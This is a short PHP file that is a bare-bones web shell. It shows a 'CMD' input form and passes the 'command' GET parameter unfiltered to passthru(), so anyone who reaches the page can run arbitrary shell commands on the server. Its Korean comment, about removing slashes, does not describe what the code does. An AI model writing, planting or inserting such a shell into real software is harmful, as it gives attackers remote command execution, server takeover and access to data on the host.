<?php
echo "
    <FORM action=$PHP_SELF METHOD=get>
    CMD : <INPUT TYPE='text' name=command SIZE=40>
    <INPUT TYPE=submit VALUE='Enter'></FORM>
    <HR><XMP></XMP><HR>";
// 슬래시를 없애는 커맨드 
$command = $_GET['command'];
echo "<XMP>"; 
echo passthru($command); 
echo"</XMP>";
?>